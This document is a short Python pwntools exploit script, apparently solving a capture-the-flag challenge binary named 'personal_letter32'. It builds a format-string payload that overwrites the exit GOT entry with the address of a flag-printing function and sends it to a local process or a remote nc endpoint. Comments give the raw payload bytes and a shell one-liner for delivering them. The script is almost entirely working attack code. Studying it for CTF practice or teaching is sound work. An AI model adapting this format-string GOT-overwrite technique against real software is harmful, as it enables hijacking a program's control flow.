from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    printFlag = 0x804872b
    exit_got = 0x804a030
    value = printFlag
    init_index = 26
    init_printLen = 8
    buf = fmtstr_payload(26, {exit_got: printFlag}, 8, 'short')
    print(repr(buf))
    proc.sendline(buf)
    return buf


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc localhost port'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./personal_letter32'], env={'LD_LIBRARY_PATH': './'})
    buf = exploit()
    proc.interactive()
    print(repr(buf))
    # '0\xa0\x04\x082\xa0\x04\x08%34587c%26$hn%32985c%27$hn'
    # ./personal_letter32 < <(echo -ne '0\xa0\x04\x082\xa0\x04\x08%34587c%26$hn%32985c%27$hn')
    # Don't use python -c, it will filter some character
